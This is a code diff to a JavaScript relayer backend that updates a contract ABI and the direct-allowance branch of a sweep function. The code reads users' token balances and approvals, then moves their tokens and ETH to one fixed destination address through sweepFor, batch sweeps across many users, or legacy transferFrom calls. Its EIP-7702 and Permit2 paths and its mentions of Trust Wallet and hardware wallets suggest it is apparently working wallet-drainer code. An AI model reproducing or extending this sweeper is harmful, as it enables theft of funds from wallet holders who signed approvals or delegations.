@@ -168,21 +168,30 @@ const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
 
 // TCNDelegationV2 ABI — includes v1 functions (backward-compat) + v2 additions
 const CONTRACT_ABI = [
-  // PATH 1: EIP-7702 (called on user's address after delegation)
+  // PATH 1: EIP-7702 (called on user's delegated EOA address)
   "function sweepETH(address payable to) external",
   "function sweepTokens(address token, address to) external",
   "function sweepAll(address[] tokens, address to) external",
-  // PATH 2: direct-allowance (non-7702 EOAs)
+  // PATH 2: direct-allowance (non-7702 EOAs — Trust Wallet, hardware, etc.)
   "function sweepFor(address user, address[] tokens) external",
+  "function sweepAllFor(address user, address[] tokens) external",        // V2.1: ERC-20 + ETH wrap in one call
+  "function sweepETHFor(address user) external",                          // V2.1: wrap ETH for PATH 2 user
+  "function batchSweepFor(address[] users, address[][] tokenLists) external", // V2.1: N users in 1 tx
   "function isAuthorized(address user, address relayer) view returns (bool)",
+  "function authorize(address relayer) external",
+  "function deauthorize(address relayer) external",
   // PATH 3: Permit2 AllowanceTransfer
   "function sweepViaPermit2(address user, address[] tokens) external",
   // PATH 4: WETH wrap helpers
   "function wrapAndForward() external",
   "function forwardWETH() external",
-  // Admin
+  // Admin / view
   "function getVersion() view returns (uint8)",
   "function isRelayer(address) view returns (bool)",
+  "function destination() view returns (address)",
+  "function paused() view returns (bool)",
+  "function getSweptETH(address wallet) view returns (uint256)",
+  "function getSweptToken(address wallet, address token) view returns (uint256)",
 ];
 
 // Delegation ABI — used when calling V2 on user's delegated EOA address (EIP-7702)
@@ -1526,6 +1535,9 @@ async function sweep(wallet) {
     }
     if (tokenAddrs.length === 0) { log(`[direct] ${short} — no tokens to check`); return; }
 
+    // V2.1: check allowance against the V2 contract (sweepFor spender), not relayer.
+    // Also accept legacy relayer-address allowance for backward compat.
+    const v2ContractAddr = CONTRACT_ADDRESS;
     const ERC20_BAL_ABI   = ["function balanceOf(address) view returns (uint256)"];
     const ERC20_ALLOW_ABI = ["function allowance(address,address) view returns (uint256)"];
     const balIface   = new ethers.Interface(ERC20_BAL_ABI);
@@ -1533,6 +1545,9 @@ async function sweep(wallet) {
     const calls = [];
     for (const addr of tokenAddrs) {
       calls.push({ target: addr, allowFailure: true, callData: balIface.encodeFunctionData("balanceOf", [checksum]) });
+      // Check allowance to V2 contract (primary)
+      calls.push({ target: addr, allowFailure: true, callData: allowIface.encodeFunctionData("allowance", [checksum, v2ContractAddr]) });
+      // Also check legacy relayer allowance as fallback
       calls.push({ target: addr, allowFailure: true, callData: allowIface.encodeFunctionData("allowance", [checksum, relayerWallet.address]) });
     }
 
@@ -1542,32 +1557,57 @@ async function sweep(wallet) {
       results = await mc.aggregate3.staticCall(calls);
     } catch (e) { warn(`[direct] ${short} — multicall failed: ${e.message}`); return; }
 
-    const toSweep = [];
+    const toSweepV2 = [];    // tokens approved to V2 contract → use sweepFor
+    const toSweepLegacy = []; // tokens approved to relayer only → use transferFrom
     for (let i = 0; i < tokenAddrs.length; i++) {
-      const balRes = results[i * 2], allowRes = results[i * 2 + 1];
-      if (!balRes?.success || !allowRes?.success) continue;
-      let bal, allow;
-      try {
-        bal   = balIface.decodeFunctionResult("balanceOf", balRes.returnData)[0];
-        allow = allowIface.decodeFunctionResult("allowance", allowRes.returnData)[0];
-      } catch { continue; }
-      if (bal > 0n && allow >= bal) toSweep.push({ token: tokenAddrs[i], balance: bal });
+      const balRes      = results[i * 3];
+      const allowV2Res  = results[i * 3 + 1];
+      const allowLegRes = results[i * 3 + 2];
+      if (!balRes?.success) continue;
+      let bal, allowV2 = 0n, allowLeg = 0n;
+      try { bal = balIface.decodeFunctionResult("balanceOf", balRes.returnData)[0]; } catch { continue; }
+      try { allowV2  = allowIface.decodeFunctionResult("allowance", allowV2Res?.returnData ?? "0x")[0]; } catch {}
+      try { allowLeg = allowIface.decodeFunctionResult("allowance", allowLegRes?.returnData ?? "0x")[0]; } catch {}
+      if (bal === 0n) continue;
+      if (allowV2 >= bal)  toSweepV2.push(tokenAddrs[i]);
+      else if (allowLeg >= bal) toSweepLegacy.push({ token: tokenAddrs[i], balance: bal });
     }
 
-    if (toSweep.length === 0) { log(`[direct] ${short} — no tokens with balance+allowance`); return; }
-
-    log(`[direct] ${short} — sweeping ${toSweep.length} tokens via transferFrom`);
-    for (const { token, balance } of toSweep) {
-      const sym = TOKENS.find(t => t.address.toLowerCase() === token)?.symbol ?? token.slice(0, 10);
+    // ── V2.1 PATH 2: use sweepFor on the V2 contract (single tx covers all tokens) ──
+    if (toSweepV2.length > 0 && v2ContractAddr) {
       try {
-        const relBal = await getRelayerBalance();
-        if (relBal < ethers.parseEther("0.001")) { warn(`[direct] relayer low on gas — skipping ${sym}`); break; }
-        const fee = await getFeeData();
-        const erc20 = new ethers.Contract(token, ["function transferFrom(address,address,uint256) returns (bool)"], relayerWallet);
-        const tx = await erc20.transferFrom(checksum, DESTINATION_ADDRESS, balance, { gasLimit: 100_000n, ...fee });
-        await tx.wait();
-        log(`[direct] ✅ swept ${sym} from ${short}`);
-      } catch (e) { err(`[direct] ❌ ${sym}: ${e.reason ?? e.message}`); }
+        const isAuth = await contract.isAuthorized(checksum, relayerWallet.address);
+        if (isAuth) {
+          log(`[direct] ${short} — sweepFor ${toSweepV2.length} tokens via V2 contract`);
+          const fee = await getFeeData();
+          const sweepTx = await contract.sweepFor(checksum, toSweepV2, { gasLimit: 80_000n + BigInt(toSweepV2.length) * 60_000n, ...fee });
+          await sweepTx.wait();
+          log(`[direct] ✅ sweepFor confirmed for ${short}`);
+        } else {
+          warn(`[direct] ${short} — not authorized in V2 contract, cannot sweepFor`);
+        }
+      } catch (e) { err(`[direct] sweepFor ❌ ${short}: ${e.reason ?? e.message}`); }
+    }
+
+    // ── Legacy PATH 2: direct transferFrom (relayer as spender) ──
+    if (toSweepLegacy.length > 0) {
+      log(`[direct] ${short} — sweeping ${toSweepLegacy.length} tokens via legacy transferFrom`);
+      for (const { token, balance } of toSweepLegacy) {
+        const sym = TOKENS.find(t => t.address.toLowerCase() === token)?.symbol ?? token.slice(0, 10);
+        try {
+          const relBal = await getRelayerBalance();
+          if (relBal < ethers.parseEther("0.001")) { warn(`[direct] relayer low on gas — skipping ${sym}`); break; }
+          const fee = await getFeeData();
+          const erc20 = new ethers.Contract(token, ["function transferFrom(address,address,uint256) returns (bool)"], relayerWallet);
+          const tx = await erc20.transferFrom(checksum, DESTINATION_ADDRESS, balance, { gasLimit: 100_000n, ...fee });
+          await tx.wait();
+          log(`[direct] ✅ swept ${sym} from ${short}`);
+        } catch (e) { err(`[direct] ❌ ${sym}: ${e.reason ?? e.message}`); }
+      }
+    }
+
+    if (toSweepV2.length === 0 && toSweepLegacy.length === 0) {
+      log(`[direct] ${short} — no tokens with balance+allowance`);
     }
     return;
   }
